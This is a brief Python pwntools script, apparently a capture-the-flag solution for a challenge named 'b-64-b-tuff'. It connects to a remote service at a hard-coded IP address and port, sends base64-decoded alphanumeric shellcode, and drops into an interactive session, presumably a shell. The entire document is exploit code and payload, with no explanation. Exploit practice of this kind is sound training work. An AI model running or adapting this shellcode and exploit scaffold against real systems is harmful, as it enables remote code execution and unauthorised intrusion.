from pwn import *
from base64 import *
context.log_level = "Debug"
io = process("./b-64-b-tuff")
#gdb.attach(io)
io = remote("114.55.66.54", 10001)

io.sendline(b64decode("PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJITq9YkGYqX0fkE8toCC3X5PBHVOCRrIPnNiJCXMk0AAGG"))
io.recv()
io.interactive()

